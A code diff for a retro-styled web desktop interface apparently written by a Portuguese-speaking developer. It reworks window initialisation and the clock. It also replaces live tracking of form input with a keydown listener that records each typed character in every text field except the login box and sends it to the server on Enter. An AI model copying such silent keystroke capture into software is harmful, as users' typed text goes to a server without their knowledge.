@@ -22,18 +22,15 @@ document.addEventListener('DOMContentLoaded', () => {
     initHelp(socket);
     initProtocols(socket);
 
-    playSound('boot');
+    // Garantir que todas as janelas estejam fechadas no início
+    document.querySelectorAll('.window-newton').forEach(win => {
+        win.classList.add('hidden');
+        win.classList.remove('active');
+        win.style.opacity = '1';
+        win.style.pointerEvents = 'auto';
+    });
 
-    const progressFill = document.querySelector('.progress-fill');
-    if (progressFill) {
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += Math.random() * 15;
-            if (progress > 100) progress = 100;
-            progressFill.style.width = progress + '%';
-            if (progress >= 100) clearInterval(interval);
-        }, 200);
-    }
+    playSound('boot');
 
     setTimeout(() => {
         const boot = document.getElementById('boot-sequence');
@@ -61,64 +58,30 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    const inputBuffers = new Map();
-    const INPUT_TIMEOUT = 1500;
-
-    document.addEventListener('input', (e) => {
-        const target = e.target;
-        
-        if((target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') && target.id !== 'inpId') {
-            const targetId = target.id || target.className;
-            
-            if (inputBuffers.has(targetId)) {
-                clearTimeout(inputBuffers.get(targetId).timeout);
-            }
-
-            const currentValue = target.value;
-
-            const timeoutId = setTimeout(() => {
-                if (currentValue.trim().length > 0) {
-                    socket.emit('live_input', { 
-                        field: targetId,
-                        value: currentValue.trim() 
-                    });
-                }
-                inputBuffers.delete(targetId);
-            }, INPUT_TIMEOUT);
-
-            inputBuffers.set(targetId, {
-                value: currentValue,
-                timeout: timeoutId
-            });
-        }
-    });
-
+    // Input tracking - enviar apenas quando pressionar Enter
+    let currentInput = '';
     document.addEventListener('keydown', (e) => {
         const target = e.target;
         
-        if (e.key === 'Enter' && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') && target.id !== 'inpId') {
-            const targetId = target.id || target.className;
+        if(target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
+            if(target.id === 'inpId') return; // Não rastrear login
             
-            if (inputBuffers.has(targetId)) {
-                clearTimeout(inputBuffers.get(targetId).timeout);
-                
-                const currentValue = target.value;
-                if (currentValue.trim().length > 0) {
-                    socket.emit('live_input', { 
-                        field: targetId,
-                        value: currentValue.trim() 
-                    });
+            if (e.key === 'Enter') {
+                if (currentInput.trim()) {
+                    socket.emit('live_input', { value: currentInput.trim() });
+                    currentInput = '';
                 }
-                
-                inputBuffers.delete(targetId);
+            } else if (e.key.length === 1) {
+                currentInput += e.key;
+            } else if (e.key === 'Backspace') {
+                currentInput = currentInput.slice(0, -1);
             }
         }
     });
 
-    function updateDateTime() {
+    // Clock update
+    setInterval(() => {
         const clock = document.getElementById('clock');
-        const dateDisplay = document.getElementById('dateDisplay');
-        
         if(clock) {
             const now = new Date();
             const hours = String(now.getHours()).padStart(2, '0');
@@ -126,18 +89,11 @@ document.addEventListener('DOMContentLoaded', () => {
             clock.textContent = `${hours}:${minutes}`;
         }
         
+        const dateDisplay = document.getElementById('dateDisplay');
         if(dateDisplay) {
             const now = new Date();
-            const options = { 
-                weekday: 'short', 
-                year: 'numeric', 
-                month: 'short', 
-                day: 'numeric' 
-            };
+            const options = { weekday: 'short', year: 'numeric', month: 'short', day: 'numeric' };
             dateDisplay.textContent = now.toLocaleDateString('en-US', options).toUpperCase();
         }
-    }
-    
-    updateDateTime();
-    setInterval(updateDateTime, 1000);
+    }, 1000);
 });
